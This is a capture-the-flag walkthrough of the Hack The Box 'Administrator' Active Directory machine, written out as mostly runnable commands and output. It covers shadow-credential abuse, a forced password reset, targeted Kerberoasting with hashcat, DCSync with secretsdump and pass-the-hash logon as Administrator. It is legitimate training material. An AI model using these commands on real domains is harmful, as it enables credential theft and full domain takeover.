+++
type       = "box"
title      = "Administrator"
author     = "conflict"
date       = "2024-11-23"
tags       = ["windows", "active-directory", "kerberos", "acl-abuse", "dacl"]
platform   = "hackthebox"
os         = "windows"
difficulty = "medium"
pinned     = false
+++

## Overview

Administrator is a medium Windows Active Directory machine. The attack chain goes through DACL misconfiguration abuse, targeted Kerberoasting, and a credential reuse chain across multiple accounts before landing Domain Admin.

## Enumeration

```terminal
$ nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,5985 10.10.11.42
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
445/tcp  open  microsoft-ds
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Domain: `administrator.htb`. Initial credentials provided: `Olivia:ichliebedich`.

## Foothold — WinRM as Olivia

```terminal
$ evil-winrm -i 10.10.11.42 -u Olivia -p ichliebedich
*Evil-WinRM* PS C:\Users\Olivia\Documents>
```

## Privilege Escalation

### BloodHound enumeration

```terminal
$ bloodhound-python -u Olivia -p ichliebedich -d administrator.htb -ns 10.10.11.42 -c All
```

BloodHound shows:

- **Olivia** has `GenericWrite` over **Michael**
- **Michael** has `ForceChangePassword` over **Benjamin**
- **Benjamin** is member of `Share Moderators`
- **Emily** (in `Share Moderators`) has `GenericWrite` over **Ethan**
- **Ethan** has `DCSync` rights on the domain

### Abusing GenericWrite — Shadow Credentials on Michael

```python
# pywhisker
python3 pywhisker.py -d administrator.htb -u Olivia -p ichliebedich \
    --target Michael --action add
```

This gives us a PFX + password. We use it to get Michael's NT hash via PKINIT:

```terminal
$ python3 gettgtpkinit.py -cert-pfx michael.pfx -pfx-pass <pass> \
    administrator.htb/Michael michael.ccache
$ export KRB5CCNAME=michael.ccache
$ python3 getnthash.py -key <as_rep_key> administrator.htb/Michael
NT: d5b7b8f2e4d3a1c6...
```

### ForceChangePassword — Benjamin

```terminal
$ net rpc password Benjamin 'P@ssw0rd123!' -U administrator.htb/Michael%<NT> \
    -S 10.10.11.42
```

### FTP — credential dump

Logging as Benjamin on FTP gives us `Backup.psafe3` — a Password Safe database. Opening with `pwsafe` after cracking the master password reveals Emily's credentials.

### GenericWrite on Ethan — Kerberoast

With Emily, set a fake SPN on Ethan and Kerberoast:

```terminal
$ python3 targetedKerberoast.py -u Emily -p '<pass>' -d administrator.htb \
    --only-abuse
```

Crack with hashcat:

```terminal
$ hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt
```

### DCSync → Domain Admin

```terminal
$ secretsdump.py administrator.htb/Ethan:<pass>@10.10.11.42
[*] Dumping Domain Credentials
Administrator:500:aad3b435...:3dc17d7c4e271b...:::
```

```terminal
$ evil-winrm -i 10.10.11.42 -u Administrator -H 3dc17d7c4e271b...
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
d1e3f...
```
